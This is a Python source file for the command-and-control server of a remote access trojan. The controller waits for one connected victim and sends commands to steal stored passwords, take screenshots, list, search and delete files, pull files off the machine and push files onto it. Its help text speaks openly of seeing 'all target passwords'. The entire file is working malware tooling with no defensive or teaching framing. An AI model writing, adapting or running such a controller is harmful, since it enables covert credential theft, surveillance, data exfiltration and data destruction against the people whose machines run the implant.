import socket
import sys
import time
import base64
import shutil


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

HEADER = 64
HOST = "192.168.14.66" # enter your own ip address 
PORT = 3221

server.bind((HOST, PORT))
print("---------------------------------\nHost : {} | PORT : {}\n---------------------------------".format(HOST, PORT))

server.listen(1)


def StartControl():
    client, address = server.accept()
    print("Connection From {}".format(address[0]))

    while True:
        try:
            command = input("Enter Command: ")
            client.send(bytes(command, "utf-8"))

            if command == "screenshot":
                Data = client.recv(100000000)

                with open("ClientScreenShot.png", "wb") as fh:
                    fh.write(base64.decodebytes(Data))

            elif command == "password":
                PasswordsData = client.recv(100000000)

                with open("passwords.txt", "wb") as pp:
                    pp.write(base64.decodebytes(PasswordsData))

            elif command == "ls":
                Files_list = client.recv(300000).decode("utf-8")
                print(Files_list)


            elif command == "remove":
                FileToRemove = input("Enter Dir / File Name To Remove: ")

                client.send(bytes(FileToRemove, "utf-8"))
                msgResult = client.recv(1000).decode("utf-8")

                print(msgResult)

            elif command == "search":
                Directory = input("Enter The Path: ")

                client.send(bytes(Directory, "utf-8"))

                Files = client.recv(100000).decode("utf-8")
                print("-------------\n" + Files + "\n-------------")
                #---------------------------------------------------

            elif command == "copy":
                MoveFileSrc = input("Enter File Src: ")
                client.send(bytes(MoveFileSrc, "utf-8"))

                GetFileType = input("Enter File Name: ")

                TheMovingFile = client.recv(100000000)

                with open(GetFileType, "wb") as FT:
                    FT.write(base64.decodebytes(TheMovingFile))
                    FT.close()

            elif command == "send":

                FileToSend = input("Enter file to send src: ")
                FileType = input("Enter file type:")
                client.send(bytes(FileType, "utf-8"))

                with open(FileToSend, "rb") as FTS:
                    encode_sending_file = base64.b64encode(FTS.read())
                    client.send(bytes(encode_sending_file))




            elif command == "help":
                print("""
password = See all target passwords
screenshot = Taking a screenshot
ls = See all files and firs in the active directory
remove = Remove a file
search = See files and dirs in path
copy = Copying file from client to server
send = Send File From The Server To The Client
disconnect = Disconnect
                """)

            elif command == "disconnect":
                sys.exit(0)

        except ConnectionAbortedError:
            print("The Client IP {} Has Disconnected".format(address[0]))
            sys.exit(0)

        except ConnectionResetError:
            print("The Client IP {} Has Disconnected".format(address[0]))
            sys.exit(0)


StartControl()
